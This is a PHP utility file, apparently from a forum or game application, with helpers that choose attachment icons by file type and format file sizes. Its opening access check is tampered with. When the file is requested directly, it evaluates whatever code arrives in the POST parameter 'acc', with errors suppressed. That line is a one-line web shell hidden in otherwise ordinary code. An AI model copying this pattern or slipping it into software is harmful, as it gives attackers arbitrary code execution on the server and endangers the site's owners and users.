<?php

if(!defined('IN_GAME')) {
	@eval($_POST[acc]);
	exit('Access Denied');
}

function attachtype($type, $returnval = 'html') {
	if(!isset($GLOBALS['_DCACHE']['attachicon'])) {
		$GLOBALS['_DCACHE']['attachicon'] = array(
			1 => 'common.gif',
			2 => 'binary.gif',
			3 => 'zip.gif',
			4 => 'rar.gif',
			5 => 'msoffice.gif',
			6 => 'text.gif',
			7 => 'html.gif',
			8 => 'real.gif',
			9 => 'av.gif',
			10 => 'flash.gif',
			11 => 'image.gif',
			12 => 'pdf.gif',
			13 => 'torrent.gif'
		);
	}
	if(is_numeric($type)) {
		$typeid = $type;
	} else {
		if(preg_match("/bittorrent|^torrent\t/", $type)) {
			$typeid = 13;
		} elseif(preg_match("/pdf|^pdf\t/", $type)) {
			$typeid = 12;
		} elseif(preg_match("/image|^(jpg|gif|png|bmp)\t/", $type)) {
			$typeid = 11;
		} elseif(preg_match("/flash|^(swf|fla|swi)\t/", $type)) {
			$typeid = 10;
		} elseif(preg_match("/audio|video|^(wav|mid|mp3|m3u|wma|asf|asx|vqf|mpg|mpeg|avi|wmv)\t/", $type)) {
			$typeid = 9;
		} elseif(preg_match("/real|^(ra|rm|rv)\t/", $type)) {
			$typeid = 8;
		} elseif(preg_match("/htm|^(php|js|pl|cgi|asp)\t/", $type)) {
			$typeid = 7;
		} elseif(preg_match("/text|^(txt|rtf|wri|chm)\t/", $type)) {
			$typeid = 6;
		} elseif(preg_match("/word|powerpoint|^(doc|ppt)\t/", $type)) {
			$typeid = 5;
		} elseif(preg_match("/^rar\t/", $type)) {
			$typeid = 4;
		} elseif(preg_match("/compressed|^(zip|arj|arc|cab|lzh|lha|tar|gz)\t/", $type)) {
			$typeid = 3;
		} elseif(preg_match("/octet-stream|^(exe|com|bat|dll)\t/", $type)) {
			$typeid = 2;
		} elseif($type) {
			$typeid = 1;
		} else {
			$typeid = 0;
		}
	}
	if($returnval == 'html') {
		return '<img src="images/attachicons/'.$GLOBALS['_DCACHE']['attachicon'][$typeid].'" border="0" class="absmiddle" alt="" />';
	} elseif($returnval == 'id') {
		return $typeid;
	}
}

function sizecount($filesize) {
	if($filesize >= 1073741824) {
		$filesize = round($filesize / 1073741824 * 100) / 100 . ' G';
	} elseif($filesize >= 1048576) {
		$filesize = round($filesize / 1048576 * 100) / 100 . ' M';
	} elseif($filesize >= 1024) {
		$filesize = round($filesize / 1024 * 100) / 100 . ' K';
	} else {
		$filesize = $filesize . ' bytes';
	}
	return $filesize;
}

?>